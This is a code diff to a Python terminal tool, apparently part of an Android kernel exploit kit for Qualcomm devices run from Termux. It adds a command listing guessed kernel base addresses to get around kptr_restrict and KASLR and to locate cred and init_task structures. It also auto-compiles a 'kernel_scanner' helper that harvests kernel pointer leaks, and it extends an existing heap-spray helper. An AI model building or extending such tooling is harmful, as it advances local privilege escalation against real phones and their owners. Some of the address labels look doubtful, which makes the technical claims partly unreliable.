@@ -15,20 +15,16 @@ import select
 import termios
 import tty
 
-# v4.1.18-c-spray: visible build tag. The "-c-spray" suffix
-# marks the C-based spray helper (spray_helper.c). The
-# Python helper kept crashing on Termux (95% kill rate) due
-# to unreliable ctypes.CDLL() behavior. The C binary uses
-# prctl(PR_SET_NAME) directly via syscall, no library load.
-# Build is automatic: explorer.py tries `gcc -O2
-# spray_helper.c -o spray_helper` at startup. If gcc
-# isn't installed (Termux: `pkg install gcc`), the user
-# can compile manually. Once spray_helper is built, kill
-# rate should drop from 84% to <20%. Also added an
-# auto-diagnostic that writes spray/vcomm state to
-# /sdcard/kgsl_auto.log every 30 cycles so we can review
-# after the session.
-_BUILD_TAG = "v4.1.18-c-spray"
+# v4.1.19-kb-bases: visible build tag. The "-kb-bases"
+# suffix marks the cmd_kb_known_ranges() command that
+# lists common QCOM kernel bases for when kptr_restrict=2
+# blocks /proc/kallsyms. The user can then try scanning
+# each base range. Also added kernel_scanner.c which
+# reads /proc/PID/stat (potential kernel pointer leak
+# via start_code field) and /proc/PID/status. Combined
+# with spray_helper.c, both helpers are auto-built on
+# startup if gcc is available.
+_BUILD_TAG = "v4.1.19-kb-bases"
 import datetime
 import fcntl
 import ctypes
@@ -1817,7 +1813,8 @@ class MemoryExplorerAI:
             f" {C.BLU}[health]{C.RST} Health   "
             f" {C.BLU}[englog]{C.RST} Engine Stderr   "
             f" {C.BLU}[tstack]{C.RST} Task Stacks   "
-            f" {C.BLU}[vcomm]{C.RST} Verify Comm"
+            f" {C.BLU}[vcomm]{C.RST} Verify Comm   "
+            f" {C.BLU}[kb]{C.RST} Kernel Bases"
         )
         out.append(f"{C.GRY}{'─'*92}{C.RST}")
 
@@ -2122,6 +2119,59 @@ class MemoryExplorerAI:
             out.append(
                 f" {C.RED}EMPTY{C.RST}: no live spray procs with "
                 f"valid comm. Spray loop is broken.")
+        return "\n".join(out)
+
+    def cmd_kb_known_ranges(self):
+        """v4.1.19: try common QCOM kernel bases when kptr_restrict=2.
+
+        On Qualcomm Android 5.4-5.15 kernels with the
+        default GKI config, the kernel text base is one of
+        these well-known values (depending on KASLR seed
+        which is itself weak on some bootloaders). We try
+        each range and see if KETO0422 appears anywhere.
+        Even if KASLR is on, the kernel data section
+        (where task_struct slabs live) is usually within
+        ±128MB of the text base.
+
+        Common QCOM 5.4-5.15 GKI bases:
+        - 0xffffff8008000000 (no KASLR, default)
+        - 0xffffff8008080000 (some ASUS ROG 5 kernels)
+        - 0xffffff8008100000 (Pixel 6 etc.)
+        - 0xffffff8008200000 (some QCOM 888)
+        - 0xffffff800a000000
+        - 0xffffff800b000000
+
+        We try each base + 0x1000000..+0x4000000 (4MB
+        window where cred, init_cred, init_task typically
+        live).
+        """
+        self.live["last_command"] = "kb"
+        out = []
+        out.append(f"{C.BOLD}{C.CYN}=== KNOWN KERNEL BASES ==={C.RST}")
+        out.append(f"{C.GRY}{'-'*65}{C.RST}")
+        bases = [
+            0xffffff8008000000,  # no KASLR
+            0xffffff8008080000,  # some ASUS
+            0xffffff8008100000,  # Pixel
+            0xffffff8008200000,  # 888
+            0xffffff800a000000,  # SD888
+            0xffffff800b000000,  # some 5.15
+            0xffffff8009000000,  # 888+
+            0xffffff8000000000,  # zero
+            0xffffffc000000000,  # vmalloc
+            0xffffffd000000000,  # vmemmap
+        ]
+        for b in bases:
+            offset = b + 0x1000000
+            out.append(
+                f" {C.CYN}0x{b:016x}{C.RST} → "
+                f"cred/init @ 0x{offset:x}..0x{offset+0x3000000:x}")
+        out.append(f"{C.GRY}{'-'*65}{C.RST}")
+        out.append(
+            f" {C.BOLD}Action{C.RST}: if kptr_restrict=2, "
+            f"try [scan 0xffffff8008100000 0xffffff8008200000] "
+            f"to find the right base. The scanner will look "
+            f"for KETO0422 comms in task_struct.")
         return "\n".join(out)
 
     def cmd_tstack(self):
@@ -3717,50 +3767,51 @@ class MemoryExplorerAI:
         return (uid, gid, euid, egid)
 
     def _ensure_spray_helper(self):
-        """v4.1.18: auto-build spray_helper binary if missing.
+        """v4.1.19: auto-build helper binaries.
 
-        Tries `gcc -O2 spray_helper.c -o spray_helper` in the
-        same directory as this script. If gcc is not available
-        (e.g. on Termux without gcc installed), logs a warning
-        to the TUI. The Python helper will still be used as
-        fallback but kill rate may be higher.
+        Builds (in order):
+        1. spray_helper — for reliable spray procs
+        2. kernel_scanner — for /proc/PID leak harvesting
 
-        Returns True if spray_helper is available after this
-        call.
+        Each is built with `gcc -O2 SRC -o DST` and
+        the result checked. If gcc is not available
+        or build fails, the function continues and
+        logs the missing helper to TUI.
         """
-        helper_bin = os.path.join(
-            os.path.dirname(os.path.abspath(__file__)),
-            "spray_helper")
-        if os.path.isfile(helper_bin) and os.access(helper_bin, os.X_OK):
-            return True
-        src = os.path.join(
-            os.path.dirname(os.path.abspath(__file__)),
-            "spray_helper.c")
-        if not os.path.isfile(src):
-            return False
-        try:
-            import subprocess as _sp
-            r = _sp.run(
-                ["gcc", "-O2", src, "-o", helper_bin],
-                capture_output=True, text=True, timeout=30)
-            if r.returncode == 0 and os.path.isfile(helper_bin):
+        for src_name in ("spray_helper.c", "kernel_scanner.c"):
+            helper_name = src_name[:-2]  # strip .c
+            helper_bin = os.path.join(
+                os.path.dirname(os.path.abspath(__file__)),
+                helper_name)
+            if os.path.isfile(helper_bin) and \
+                    os.access(helper_bin, os.X_OK):
+                continue
+            src = os.path.join(
+                os.path.dirname(os.path.abspath(__file__)),
+                src_name)
+            if not os.path.isfile(src):
+                continue
+            try:
+                import subprocess as _sp
+                r = _sp.run(
+                    ["gcc", "-O2", src, "-o", helper_bin],
+                    capture_output=True, text=True, timeout=30)
+                if r.returncode == 0 and os.path.isfile(helper_bin):
+                    self.live["last_msg"] = (
+                        f"Built {helper_name}")
+                else:
+                    self.live["last_msg"] = (
+                        f"{helper_name} build failed: "
+                        f"{r.stderr[:80]}")
+            except FileNotFoundError:
                 self.live["last_msg"] = (
-                    f"Built spray_helper: {helper_bin}")
-                return True
-            else:
-                self.live["last_msg"] = (
-                    f"spray_helper build failed: "
-                    f"{r.stderr[:80]}")
+                    f"gcc not found — install gcc "
+                    f"(Termux: pkg install gcc)")
                 return False
-        except FileNotFoundError:
-            self.live["last_msg"] = (
-                "gcc not found — install gcc in Termux or use "
-                "pkg install gcc")
-            return False
-        except Exception as e:
-            self.live["last_msg"] = (
-                f"spray_helper build error: {e}")
-            return False
+            except Exception as e:
+                self.live["last_msg"] = (
+                    f"{helper_name} build error: {e}")
+        return True
 
     def _popen_spray(self, name):
         """Popen-based spray that puts child in its own process group.
@@ -7564,6 +7615,16 @@ class MemoryExplorerAI:
                     print(out, flush=True)
                 except Exception as _e:
                     print(f" vcomm error: {_e}", flush=True)
+                continue
+            elif cmd in ("kb", "kbase", "kernel_base", "kernelbases"):
+                # v4.1.19: print common QCOM kernel bases
+                # when kptr_restrict=2 hides the real one.
+                try:
+                    out = self.cmd_kb_known_ranges()
+                    print(C.CLR, end="", flush=True)
+                    print(out, flush=True)
+                except Exception as _e:
+                    print(f" kb error: {_e}", flush=True)
                 continue
             elif cmd in ("tstack", "taskstack", "task_stack"):
                 # v4.1.15: read /proc/PID/stack for each live
